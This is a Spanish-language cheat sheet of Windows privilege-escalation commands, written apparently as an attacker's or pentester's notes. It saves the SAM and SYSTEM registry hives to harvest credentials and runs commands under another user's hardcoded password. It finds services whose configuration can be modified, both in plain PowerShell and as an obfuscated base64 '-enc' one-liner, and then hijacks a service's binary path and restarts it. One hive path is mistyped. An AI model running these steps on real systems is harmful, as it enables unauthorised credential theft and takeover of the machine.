# Escalada

## [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

## Backup SAM

```csharp
reg save HKM\sam sam.bk
reg save HKM\system sytem.bk
```

### Ejecutar comando con otro Usuario

```powershell
$pass = "password" | Convertto-securestring -asplain -force
$cred = new-object System.management.automation.pscredential('user',$pass)
invoke-command -ComputerName localhost -Cred $cred -ScriptBlock {whoami}
```

## Permisos

* SeLoadDriverPrivilege

## Servicios con Permisos de Modificación

#### Validar Permisos de Servicios

```csharp
$services = Get-WmiObject -Class Win32_Service  | Where-Object {$_}
foreach ($s in $services){
    $result = sc.exe config $($s.Name) error=$($s.ErrorControl)
    if ($result -contains "[SC] ChangeServiceConfig SUCCESS"){
        $out = new-object PSObject
        $out | Add-Member NoteProperty "ServiceName" $s.Name
        $out | Add-Member NoteProperty "Path" $s.PathName
        $out | Add-Member NoteProperty "StartName" $s.StartName
        $out

    }
}

###########b64#################
JABzAGUAcgB2AGkAYwBlAHMAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUwBlAHIAdgBpAGMAZQAgACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8AfQA7AGYAbwByAGUAYQBjAGgAIAAoACQAcwAgAGkAbgAgACQAcwBlAHIAdgBpAGMAZQBzACkAewAkAHIAZQBzAHUAbAB0ACAAPQAgAHMAYwAuAGUAeABlACAAYwBvAG4AZgBpAGcAIAAkACgAJABzAC4ATgBhAG0AZQApACAAZQByAHIAbwByAD0AJAAoACQAcwAuAEUAcgByAG8AcgBDAG8AbgB0AHIAbwBsACkAOwBpAGYAIAAoACQAcgBlAHMAdQBsAHQAIAAtAGMAbwBuAHQAYQBpAG4AcwAgACIAWwBTAEMAXQAgAEMAaABhAG4AZwBlAFMAZQByAHYAaQBjAGUAQwBvAG4AZgBpAGcAIABTAFUAQwBDAEUAUwBTACIAKQB7ACQAbwB1AHQAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFAAUwBPAGIAagBlAGMAdAA7ACQAbwB1AHQAIAB8ACAAQQBkAGQALQBNAGUAbQBiAGUAcgAgAE4AbwB0AGUAUAByAG8AcABlAHIAdAB5ACAAIgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIgAgACQAcwAuAE4AYQBtAGUAOwAkAG8AdQB0ACAAfAAgAEEAZABkAC0ATQBlAG0AYgBlAHIAIABOAG8AdABlAFAAcgBvAHAAZQByAHQAeQAgACIAUABhAHQAaAAiACAAJABzAC4AUABhAHQAaABOAGEAbQBlADsAJABvAHUAdAAgAHwAIABBAGQAZAAtAE0AZQBtAGIAZQByACAATgBvAHQAZQBQAHIAbwBwAGUAcgB0AHkAIAAiAFMAdABhAHIAdABOAGEAbQBlACIAIAAkAHMALgBTAHQAYQByAHQATgBhAG0AZQA7ACQAbwB1AHQAfQB9AA==
powershell -enc "JABzAGUAcgB2AGkAYwBlAHMAIAA9ACAARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AUwBlAHIAdgBpAGMAZQAgACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAkAF8AfQA7AGYAbwByAGUAYQBjAGgAIAAoACQAcwAgAGkAbgAgACQAcwBlAHIAdgBpAGMAZQBzACkAewAkAHIAZQBzAHUAbAB0ACAAPQAgAHMAYwAuAGUAeABlACAAYwBvAG4AZgBpAGcAIAAkACgAJABzAC4ATgBhAG0AZQApACAAZQByAHIAbwByAD0AJAAoACQAcwAuAEUAcgByAG8AcgBDAG8AbgB0AHIAbwBsACkAOwBpAGYAIAAoACQAcgBlAHMAdQBsAHQAIAAtAGMAbwBuAHQAYQBpAG4AcwAgACIAWwBTAEMAXQAgAEMAaABhAG4AZwBlAFMAZQByAHYAaQBjAGUAQwBvAG4AZgBpAGcAIABTAFUAQwBDAEUAUwBTACIAKQB7ACQAbwB1AHQAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFAAUwBPAGIAagBlAGMAdAA7ACQAbwB1AHQAIAB8ACAAQQBkAGQALQBNAGUAbQBiAGUAcgAgAE4AbwB0AGUAUAByAG8AcABlAHIAdAB5ACAAIgBTAGUAcgB2AGkAYwBlAE4AYQBtAGUAIgAgACQAcwAuAE4AYQBtAGUAOwAkAG8AdQB0ACAAfAAgAEEAZABkAC0ATQBlAG0AYgBlAHIAIABOAG8AdABlAFAAcgBvAHAAZQByAHQAeQAgACIAUABhAHQAaAAiACAAJABzAC4AUABhAHQAaABOAGEAbQBlADsAJABvAHUAdAAgAHwAIABBAGQAZAAtAE0AZQBtAGIAZQByACAATgBvAHQAZQBQAHIAbwBwAGUAcgB0AHkAIAAiAFMAdABhAHIAdABOAGEAbQBlACIAIAAkAHMALgBTAHQAYQByAHQATgBhAG0AZQA7ACQAbwB1AHQAfQB9AA=="

```

#### Cambiar el Path de Ejecución

```csharp
sc.exe config "Servicio" binPath="NuevoPath"
sc.exe stop "Servicio"
sc.exe start "Servicio"
```

